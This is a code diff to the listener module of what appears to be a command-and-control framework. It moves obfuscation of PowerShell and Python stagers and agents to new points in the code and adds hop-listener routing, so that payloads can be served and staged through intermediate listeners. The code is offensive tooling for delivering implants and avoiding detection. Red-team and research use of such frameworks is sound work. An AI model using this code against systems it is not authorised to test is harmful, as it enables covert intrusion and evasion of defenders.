@@ -384,6 +384,8 @@ class Listener(object):
                         stager,
                         obfuscation_command=obfuscation_command,
                     )
+                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
                 # base64 encode the stager and return it
                 if encode and (
                     (not obfuscate) or ("launcher" not in obfuscation_command.lower())
@@ -481,6 +483,15 @@ class Listener(object):
 
                 # download the stager and extract the IV
                 launcherBase += listener_util.python_extract_stager(staging_key)
+
+                if obfuscate:
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate(
+                        launcherBase,
+                        obfuscation_command=obfuscation_command,
+                    )
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
+                        launcherBase
+                    )
 
                 if encode:
                     launchEncoded = base64.b64encode(
@@ -583,10 +594,6 @@ class Listener(object):
             }
             stager = template.render(template_options)
 
-            # Get the random function name generated at install and patch the stager with the proper function name
-            if obfuscate:
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
@@ -605,24 +612,26 @@ class Listener(object):
                 )
 
             stagingKey = stagingKey.encode("UTF-8")
-            unobfuscated_stager = listener_util.remove_lines_comments(stager)
+            stager = listener_util.remove_lines_comments(stager)
 
             if obfuscate:
-                unobfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
-                    unobfuscated_stager, obfuscation_command=obfuscation_command
+                stager = self.mainMenu.obfuscationv2.obfuscate(
+                    stager, obfuscation_command=obfuscation_command
                 )
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
             # base64 encode the stager and return it
             # There doesn't seem to be any conditions in which the encrypt flag isn't set so the other
             # if/else statements are irrelevant
             if encode:
-                return helpers.enc_powershell(unobfuscated_stager)
+                return helpers.enc_powershell(stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey, unobfuscated_stager.encode("UTF-8")
+                    RC4IV + stagingKey, stager.encode("UTF-8")
                 )
             else:
-                return unobfuscated_stager
+                return stager
 
         elif language.lower() == "python":
             template_path = [
@@ -644,6 +653,10 @@ class Listener(object):
                 "stage_2": stage2,
             }
             stager = template.render(template_options)
+
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # base64 encode the stager and return it
             if encode:
@@ -693,10 +706,6 @@ class Listener(object):
             with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                 code = f.read()
 
-            if obfuscate:
-                # Get the random function name generated at install and patch the stager with the proper function name
-                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
-
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
 
@@ -721,6 +730,7 @@ class Listener(object):
                     code,
                     obfuscation_command=obfuscation_command,
                 )
+                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
             return code
 
         elif language == "python":
@@ -757,6 +767,10 @@ class Listener(object):
                     'workingHours = "REPLACE_WORKINGHOURS"',
                     f'workingHours = "{ killDate }"',
                 )
+
+            if obfuscate:
+                code = self.mainMenu.obfuscationv2.python_obfuscate(code)
+                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
         elif language == "csharp":
@@ -854,7 +868,8 @@ class Listener(object):
         WSGIRequestHandler.protocol_version = "HTTP/1.1"
 
         @app.route("/download/<stager>/")
-        def send_stager(stager):
+        @app.route("/download/<stager>/<hop>")
+        def send_stager(stager, hop=None):
             with SessionLocal.begin() as db:
                 if stager == "ironpython":
                     obfuscation_config = (
@@ -869,7 +884,7 @@ class Listener(object):
 
             if "powershell" == stager:
                 launcher = self.mainMenu.stagers.generate_launcher(
-                    listenerName=listenerName,
+                    listenerName=hop or listenerName,
                     language="powershell",
                     encode=False,
                     obfuscate=obfuscation,
@@ -882,7 +897,7 @@ class Listener(object):
 
             elif "python" == stager:
                 launcher = self.mainMenu.stagers.generate_launcher(
-                    listenerName,
+                    listenerName=hop or listenerName,
                     language="python",
                     encode=False,
                     obfuscate=obfuscation,
@@ -894,15 +909,23 @@ class Listener(object):
                 return launcher
 
             elif "ironpython" == stager:
-                launcher = self.mainMenu.stagers.generate_launcher(
-                    listenerName,
-                    language="python",
-                    encode=False,
-                    obfuscate=obfuscation,
-                    userAgent=userAgent,
-                    proxy=proxy,
-                    proxyCreds=proxyCreds,
-                )
+                if hop:
+                    options = copy.deepcopy(self.options)
+                    options["Listener"] = {}
+                    options["Listener"]["Value"] = hop
+                    options["Language"] = {}
+                    options["Language"]["Value"] = stager
+                    launcher = self.mainMenu.stagers.generate_stageless(options)
+                else:
+                    launcher = self.mainMenu.stagers.generate_launcher(
+                        listenerName=hop or listenerName,
+                        language="python",
+                        encode=False,
+                        obfuscate=obfuscation,
+                        userAgent=userAgent,
+                        proxy=proxy,
+                        proxyCreds=proxyCreds,
+                    )
 
                 directory = self.mainMenu.stagers.generate_python_exe(
                     launcher, dot_net_version="net40", obfuscate=obfuscation
@@ -913,7 +936,7 @@ class Listener(object):
 
             elif "csharp" == stager:
                 filename = self.mainMenu.stagers.generate_launcher(
-                    listenerName,
+                    listenerName=hop or listenerName,
                     language="csharp",
                     encode=False,
                     obfuscate=obfuscation,
@@ -1039,20 +1062,40 @@ class Listener(object):
                                 self.instance_log.info(message)
                                 log.info(message)
 
+                                # Check for hop listener
+                                hopListenerName = request.headers.get("Hop-Name")
+                                hopListener = self.mainMenu.listenersv2.get_active_listener_by_name(
+                                    hopListenerName
+                                )
+
                                 with SessionLocal() as db:
                                     obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                                         db, language
                                     )
-                                    stage = self.generate_stager(
-                                        language=language,
-                                        listenerOptions=listenerOptions,
-                                        obfuscate=False
-                                        if not obf_config
-                                        else obf_config.enabled,
-                                        obfuscation_command=""
-                                        if not obf_config
-                                        else obf_config.command,
-                                    )
+
+                                    if hopListener:
+                                        stage = hopListener.generate_stager(
+                                            language=language,
+                                            listenerOptions=hopListener.options,
+                                            obfuscate=False
+                                            if not obf_config
+                                            else obf_config.enabled,
+                                            obfuscation_command=""
+                                            if not obf_config
+                                            else obf_config.command,
+                                        )
+
+                                    else:
+                                        stage = self.generate_stager(
+                                            language=language,
+                                            listenerOptions=listenerOptions,
+                                            obfuscate=False
+                                            if not obf_config
+                                            else obf_config.enabled,
+                                            obfuscation_command=""
+                                            if not obf_config
+                                            else obf_config.command,
+                                        )
                                 return make_response(stage, 200)
 
                             elif results.startswith(b"ERROR:"):
